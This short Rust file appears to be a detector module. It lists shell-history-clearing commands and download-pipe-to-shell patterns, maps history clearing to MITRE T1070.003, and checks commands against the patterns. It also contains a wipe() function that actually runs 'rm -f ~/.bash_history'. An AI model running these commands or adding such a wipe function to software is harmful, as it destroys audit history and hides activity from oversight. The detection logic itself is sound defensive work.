pub const HISTORY_CLEARING_PATTERNS: &[&str] = &[
    "history -c",
    "rm -f ~/.bash_history",
    "rm ~/.bash_history",
];
pub const DOWNLOAD_PIPE_TO_SHELL_PATTERNS: &[&str] = &[
    "curl | sh",
    "wget | sh",
];
pub const MITRE_HISTORY_CLEARING: &[&str] = &["T1070.003"];
pub fn is_history_tampering(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    HISTORY_CLEARING_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}
pub fn wipe() {
    std::process::Command::new("sh").arg("-c").arg("rm -f ~/.bash_history").status().ok();
}
